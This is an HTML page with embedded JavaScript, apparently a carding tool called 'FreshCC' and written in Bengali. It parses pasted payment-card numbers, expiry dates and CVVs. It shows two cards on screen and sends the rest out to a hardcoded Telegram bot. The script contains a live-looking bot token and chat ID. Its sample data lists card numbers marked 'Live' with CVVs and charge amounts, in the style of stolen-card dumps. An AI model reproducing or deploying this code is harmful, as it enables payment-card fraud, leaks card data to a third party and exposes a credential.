<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>FreshCC - Telegram Auto Forward (Ryan's Bot)</title>
    <style>
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63);
            font-family: monospace;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            border-radius: 16px;
            padding: 25px;
        }
        textarea {
            width: 100%;
            padding: 12px;
            font-family: monospace;
            border: 2px solid #667eea;
            border-radius: 8px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px 5px;
        }
        .output {
            background: #1a1a2e;
            color: #0f0;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            white-space: pre-wrap;
        }
        .success { background: #d4edda; color: #155724; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .error { background: #f8d7da; color: #721c24; padding: 10px; margin: 10px 0; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 FreshCC <span style="color:#667eea">@ZayenCoder</span></h1>
        <p>📌 কার্ড ইনপুট দিন → প্রথম ২টি এখানে থাকবে → বাকিগুলো <strong>Telegram (@userCardinfobot)</strong> এ যাবে</p>

        <textarea id="inputData" rows="8" placeholder="পেস্ট করুন আপনার কার্ড ডাটা..."></textarea>
        
        <div>
            <button onclick="processAndForward()">🚀 প্রসেস & ফরওয়ার্ড</button>
            <button onclick="loadSample()">📝 স্যাম্পল</button>
            <button onclick="clearAll()">🗑️ ক্লিয়ার</button>
        </div>

        <div id="status"></div>

        <div class="output">
            <h3>✅ প্রথম ২টি কার্ড (এখানে থাকবে):</h3>
            <pre id="firstTwo">—</pre>
        </div>

        <div class="output">
            <h3>📤 বাকি কার্ড (Telegram এ পাঠানো হবে):</h3>
            <pre id="restCards">—</pre>
        </div>

        <div style="text-align:center; margin-top:20px; color:#888;">
            🤖 Telegram Bot: <strong>@userCardinfobot</strong> | Chat ID: <strong>5803440437</strong> | © FreshCC
        </div>
    </div>

    <script>
        // ✅ আপনার কনফিগারেশন (Chat ID বসানো হয়েছে)
        const BOT_TOKEN = "8602982031:AAF71cFUjb7Qj7hnU3QwVgxecsZVtYLTWTc";
        const CHAT_ID = "5803440437";  // আপনার Chat ID

        function extractCards(text) {
            const lines = text.trim().split('\n');
            const cards = [];
            const regex = /(\d{16})\|(\d{2})\|(\d{4})\|(\d{3,4})/;
            for (const line of lines) {
                const match = line.match(regex);
                if (match) cards.push(`${match[1]}|${match[2]}|${match[3]}|${match[4]}`);
            }
            return cards;
        }

        async function sendToTelegram(cards) {
            if (!CHAT_ID) {
                return { success: false, message: "⚠️ Chat ID সেট করা হয়নি!" };
            }

            const message = `🆕 *FreshCC থেকে নতুন কার্ড*\n\n📋 *মোট:* ${cards.length} টি\n━━━━━━━━━━━━━━━━━\n${cards.map((c, i) => `${i+1}. \`${c}\``).join('\n')}\n━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n🔗 @ZayenCoder | FreshCC`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                });
                const result = await response.json();
                
                if (result.ok) return { success: true, message: `✅ ${cards.length} টি কার্ড Telegram এ পাঠানো হয়েছে` };
                else return { success: false, message: `❌ Error: ${result.description}` };
            } catch (error) {
                return { success: false, message: `❌ Connection Error: ${error.message}` };
            }
        }

        async function processAndForward() {
            const input = document.getElementById('inputData').value;
            
            if (!input.trim()) {
                document.getElementById('status').innerHTML = '<div class="error">❌ দয়া করে কিছু ইনপুট দিন!</div>';
                return;
            }

            const allCards = extractCards(input);
            
            if (allCards.length === 0) {
                document.getElementById('status').innerHTML = '<div class="error">❌ কোনো বৈধ কার্ড পাওয়া যায়নি!</div>';
                return;
            }

            const firstTwo = allCards.slice(0, 2);
            const restCards = allCards.slice(2);

            document.getElementById('firstTwo').textContent = firstTwo.join('\n') || '(কোনো কার্ড নেই)';
            document.getElementById('restCards').textContent = restCards.join('\n') || '(কোনো কার্ড নেই)';

            document.getElementById('status').innerHTML = `<div class="success">📊 মোট ${allCards.length} টি কার্ড | প্রথম ২টি এখানে রাখা হয়েছে</div>`;

            if (restCards.length > 0) {
                const result = await sendToTelegram(restCards);
                document.getElementById('status').innerHTML += `<div class="${result.success ? 'success' : 'error'}">${result.message}</div>`;
            } else {
                document.getElementById('status').innerHTML += '<div class="success">ℹ️ ২টির বেশি কার্ড নেই, ফরওয়ার্ড করার কিছু নেই</div>';
            }
        }

        function loadSample() {
            document.getElementById('inputData').value = `Live | 5154620022516551|02|2028|437| [Charge :$2,5]
Live | 5154620022755043|02|2028|622| [Charge :$8,2]
Live | 5154620022178428|02|2028|877| [Charge :$4,6]
Live | 5154620022568438|02|2028|556| [Charge :$2,0]
Live | 5154620022337289|02|2028|804| [Charge :$5,1]`;
            document.getElementById('status').innerHTML = '<div class="success">📝 স্যাম্পল লোড হয়েছে</div>';
        }

        function clearAll() {
            document.getElementById('inputData').value = '';
            document.getElementById('firstTwo').textContent = '—';
            document.getElementById('restCards').textContent = '—';
            document.getElementById('status').innerHTML = '';
        }
    </script>
</body>
</html>
